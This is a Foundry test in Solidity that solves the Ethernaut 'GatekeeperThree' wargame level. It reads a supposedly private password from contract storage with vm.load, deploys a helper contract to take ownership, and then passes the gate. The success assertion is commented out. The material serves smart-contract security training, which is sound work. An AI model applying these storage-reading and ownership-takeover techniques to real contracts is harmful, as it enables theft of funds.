// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/levels/GateKeeperThree/GateKeeperThreeFactory.sol";
import "../src/levels/GateKeeperThree/GateOwner.sol";
import "./BaseTest.sol";

contract GateKeeperThreeTest is BaseTest {
    GatekeeperThreeFactory gateKeeperThreeFactory;

    function setUp() public {
        gateKeeperThreeFactory = new GatekeeperThreeFactory();
        super.setUp(gateKeeperThreeFactory);
    }

    function testIsGateKeeperThreeCleared()
        public
        testWrapper(gateKeeperThreeFactory, 0)
    {
        GatekeeperThree gateKeeperThree = GatekeeperThree(payable(instance));
        gateKeeperThree.createTrick();

        bytes32 password = vm.load(
            address(gateKeeperThree.trick()),
            bytes32(uint256(2))
        );

        gateKeeperThree.getAllowance(uint256(password));

        GateOwner gateOwner = new GateOwner(instance);

        vm.deal(instance, 0.002 ether);
        gateOwner.becomeOwner();
        gateOwner.enter();

        // assertTrue(ethernaut.submitLevelInstance(payable(instance)));
        // Can't check for success.
    }
}
